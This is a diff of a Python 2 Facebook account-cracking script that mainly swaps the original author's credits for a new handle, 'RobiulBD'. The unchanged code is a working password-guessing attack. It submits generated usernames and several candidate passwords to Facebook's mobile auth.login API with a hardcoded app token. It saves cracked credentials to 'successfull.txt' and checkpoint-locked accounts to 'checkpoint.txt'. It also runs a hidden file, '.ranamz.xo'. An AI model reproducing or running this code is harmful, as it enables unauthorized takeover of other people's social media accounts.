@@ -1,7 +1,7 @@
 #!/usr/bin/python2
 #coding=utf-8
-#Author HUZAIFA PAKTOON
-#IZZAT KRO HAMARI WARNA KISS LY LEN GY TUMHARI
+#Author RobiulBD
+#Khali Maya R Maya
 
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
@@ -53,36 +53,29 @@ def t():
     time.sleep(1)
 def cb():
     os.system('clear')
-##### Dev : HUZAIFA PAKTOON 
+##### Dev : RobiulBD 
 ##### LOGO #####
 logo='''
 \033[1;91m
-
 
   ____       _     _       _ ____  ____  
  |  _ \ ___ | |__ (_)_   _| | __ )|  _ \ 
  | |_) / _ \| '_ \| | | | | |  _ \| | | |
  |  _ < (_) | |_) | | |_| | | |_) | |_| |
  |_| \_\___/|_.__/|_|\__,_|_|____/|____/ 
-                                         
+																																					
 
-                                                                                                                                
-                                                                                                                                
-                                                                                                                                
-
-                                 
-
-\033[1;90m [ IZZAT KRO HAMARI WARNA KISS LY LEN GY TUMHARI ]
+\033[1;90m [ Khali Maya R Maya ]
 
 \x1b[1;92m=============================
-\x1b[1;93m  Author  : H4HUZAIFAPAKTOON 
-\x1b[1;93m  GITHUB: https://github.com/H4HUZAIFAPAKTOON/huziLoveFari.git
-\x1b[1;93m FaceBook :www.facebook.com/MR.HUZAIFA.KHANXXX
-\x1b[1;93m LOVE : FARITRICKER
+\x1b[1;93m  Author  : RobiulBD 
+\x1b[1;93m  GITHUB: https://github.com/robiulxx/india.git
+\x1b[1;93m FaceBook :www.facebook.com/mdROBIxx
+\x1b[1;93m LOVE : RobiulBD
 \x1b[1;92m=============================
 \x1b[1;93m     ➾       NOTE !
 \x1b[1;91m=======================================
-\x1b[1;93m     ➾ !ZZ4T KR0 H4M4! W4RN4 K!SS LY LEN GY TUMHAR!
+\x1b[1;93m     ➾ ! Khali Maya R Maya !
 \x1b[1;91m======================================= '''                                                                                                                                                                                                                                                                                                                                                  
 
 CorrectUsername = "RobiulBD"
@@ -99,10 +92,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;94mWrong Password"
-            os.system('xdg-open https://www.facebook.com/101635275268527/posts/170036675095053/?app=fbl')
+            os.system('xdg-open https://www.facebook.com/mdROBIxx/?app=fbl')
     else:
         print "\033[1;94mWrong Username"
-        os.system('xdg-open https://www.facebook.com/101635275268527/posts/170036675095053/?app=fbl')
+        os.system('xdg-open https://www.facebook.com/mdROBIxx/?app=fbl')
 
 
 back = 0
@@ -222,7 +215,7 @@ def action():
 	    time.sleep(2)
 	    os.system("python2 .ranamz.xo")
 #	elif chb =='3':	
-#	    os.system('xdg-open https://www.facebook.com/101635275268527/posts/161507699281284/?app=fbl')
+#	    os.system('xdg-open https://www.facebook.com/mdROBIxx/?app=fbl')
 #	    time.sleep(1)
 #	    menu()
 	elif bch =='0':
@@ -256,14 +249,14 @@ def action():
 			data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			q = json.load(data)
 			if 'access_token' in q:
-				print '\x1b[1;92m[ HUZILOVEFARI=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
+				print '\x1b[1;92m[ RobiulBD=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass1																				
 				okb = open('save/successfull.txt', 'a')
 				okb.write(k+c+user+'|'+pass1+'\n')
 				okb.close()
 				oks.append(c+user+pass1)
 			else:
 				if 'www.facebook.com' in q['error_msg']:
-					print '\x1b[1;95mHUZILOVEFARI \x1b[1;95m[ HUZILOVEFARI=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
+					print '\x1b[1;95mRobiulBD \x1b[1;95m[ RobiulBD=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass1
 					cps = open('save/checkpoint.txt', 'a')
 					cps.write(k+c+user+'|'+pass1+'\n')
 					cps.close()
@@ -273,14 +266,14 @@ def action():
 					data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                q = json.load(data)
 					if 'access_token' in q:
-		                        	print '\x1b[1;92m[ HUZILOVEFARI=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
+		                        	print '\x1b[1;92m[ RobiulBD=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + k + c + user + '-\x1b[1;93m✙\x1b[1;91m-' + pass2                            											
 						okb = open('save/successfull.txt', 'a')
 						okb.write(k+c+user+'|'+pass2+'\n')
 						okb.close()
 						oks.append(c+user+pass2)
 					else:	
 						if 'www.facebook.com' in q['error_msg']:
-							print '\x1b[1;95mHUZILOVEFARI \x1b[1;95m[ HUZILOVEFARI=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
+							print '\x1b[1;95mRobiulBD \x1b[1;95m[ RobiulBD=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass2
 							cps = open('save/checkpoint.txt', 'a')
 							cps.write(k+c+user+'|'+pass2+'\n')
 							cps.close()
@@ -290,14 +283,14 @@ def action():
 							data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' +k+c+user+ '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
 			                                q = json.load(data)
 							if 'access_token' in q:
-								print '\x1b[1;92m[ HUZILOVEFARI=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
+								print '\x1b[1;92m[ RobiulBD=OK]\x1b[1;92m-\x1b[1;92m(u)\x1b[1;92m-' + k + c + user + '-\x1b[1;92m(p)\x1b[1;92m-' + pass3
 								okb = open('save/successfull.txt', 'a')
 								okb.write(k+c+user+'|'+pass3+'\n')
 								okb.close()
 								oks.append(c+user+pass3)
 							else:	
 								if 'www.facebook.com' in q['error_msg']:
-									print '\x1b[1;95mHUZILOVEFARI \x1b[1;95m[ HUZILOVEFARI=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
+									print '\x1b[1;95mRobiulBD \x1b[1;95m[ RobiulBD=CP]\x1b[1;95m-\x1b[1;95m[user]\x1b[1;95m-' + k + c + user + '-\x1b[1;95m[pass]\x1b[1;95m-' + pass3
 									cps = open('save/checkpoint.txt', 'a')
 									cps.write(k+c+user+'|'+pass3+'\n')
 									cps.close()
